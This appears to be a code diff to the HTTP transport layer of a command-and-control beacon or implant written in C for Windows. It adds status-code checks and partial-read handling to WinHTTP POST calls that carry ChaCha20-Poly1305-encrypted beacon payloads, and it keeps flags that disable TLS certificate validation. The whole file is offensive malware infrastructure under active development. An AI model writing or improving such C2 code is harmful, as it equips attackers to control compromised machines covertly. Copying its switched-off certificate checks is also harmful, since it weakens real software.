@@ -11,9 +11,6 @@
 #define HTTP_BUF_SIZE  (512 * 1024)
 #define PATH_BUF_SIZE  512
 
-// ---------------------------------------------------------------------------
-// WinHTTP POST — used by both raw and encrypted paths
-// ---------------------------------------------------------------------------
 static int http_post_winhttp(const char *host, int port, const char *path,
                               const uint8_t *body, int body_len,
                               uint8_t **out_body, int *out_body_len) {
@@ -80,7 +77,7 @@ static int http_post_winhttp(const char *host, int port, const char *path,
 
 #if C2_USE_HTTPS
     {
-        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA    |
+        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
@@ -97,6 +94,33 @@ static int http_post_winhttp(const char *host, int port, const char *path,
 
     if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;
 
+    /*
+     * Check HTTP status code before reading the body.
+     * A non-200 response (401 auth failure, 500 server error, etc.) means
+     * the body is not an encrypted beacon payload — decryption would fail
+     * with a tag mismatch and return NULL, which is safe but wastes work
+     * and obscures the real error in debug builds.
+     */
+    {
+        DWORD status     = 0;
+        DWORD status_len = sizeof(status);
+        if (!WinHttpQueryHeaders(hRequest,
+                                 WINHTTP_QUERY_STATUS_CODE |
+                                 WINHTTP_QUERY_FLAG_NUMBER,
+                                 WINHTTP_HEADER_NAME_BY_INDEX,
+                                 &status, &status_len,
+                                 WINHTTP_NO_HEADER_INDEX)) {
+            goto cleanup;
+        }
+        if (status != 200) {
+#ifdef DEBUG
+            fprintf(stderr, "[http] non-200 status %lu for %s\n",
+                    status, path);
+#endif
+            goto cleanup;
+        }
+    }
+
     resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
     if (!resp) goto cleanup;
 
@@ -104,9 +128,15 @@ static int http_post_winhttp(const char *host, int port, const char *path,
            bytes_available > 0 &&
            total < HTTP_BUF_SIZE - 1) {
         if (bytes_available > (DWORD)(HTTP_BUF_SIZE - 1 - total))
-            bytes_available = HTTP_BUF_SIZE - 1 - total;
+            bytes_available = (DWORD)(HTTP_BUF_SIZE - 1 - total);
+        /*
+         * Use break instead of goto cleanup on read failure so that
+         * bytes already successfully read are still returned.
+         * A partial read is better than silently discarding a large
+         * response that arrived in multiple chunks.
+         */
         if (!WinHttpReadData(hRequest, resp + total, bytes_available, &bytes_read))
-            goto cleanup;
+            break;
         if (bytes_read == 0) break;
         total += (int)bytes_read;
     }
@@ -126,14 +156,11 @@ cleanup:
     return ret;
 }
 
-// ---------------------------------------------------------------------------
-// Public API
-// ---------------------------------------------------------------------------
-
 int http_post_raw(const char *host, int port, const char *path,
                   const uint8_t *body, int body_len,
                   uint8_t **out_body, int *out_body_len) {
-    return http_post_winhttp(host, port, path, body, body_len, out_body, out_body_len);
+    return http_post_winhttp(host, port, path, body, body_len,
+                             out_body, out_body_len);
 }
 
 int http_post_encrypted(const char *host, int port, const char *path,
@@ -146,11 +173,12 @@ int http_post_encrypted(const char *host, int port, const char *path,
     int             ret          = -1;
     uint8_t         empty[1]     = {0};
     const uint8_t  *payload      = plain_data ? plain_data : empty;
+    int             payload_len  = plain_data ? plain_len  : 0;
 
     *out_plain     = NULL;
     *out_plain_len = 0;
 
-    enc_body = chacha20poly1305_encrypt(payload, plain_len, &enc_len);
+    enc_body = chacha20poly1305_encrypt(payload, (size_t)payload_len, &enc_len);
     if (!enc_body) goto cleanup;
 
     if (http_post_winhttp(host, port, path, enc_body, (int)enc_len,
@@ -160,7 +188,8 @@ int http_post_encrypted(const char *host, int port, const char *path,
     if (!resp || raw_resp_len < 12 + 16) goto cleanup;
 
     size_t   decrypted_len = 0;
-    uint8_t *plain = chacha20poly1305_decrypt(resp, (size_t)raw_resp_len, &decrypted_len);
+    uint8_t *plain = chacha20poly1305_decrypt(resp, (size_t)raw_resp_len,
+                                              &decrypted_len);
     if (!plain) goto cleanup;
 
     *out_plain     = plain;
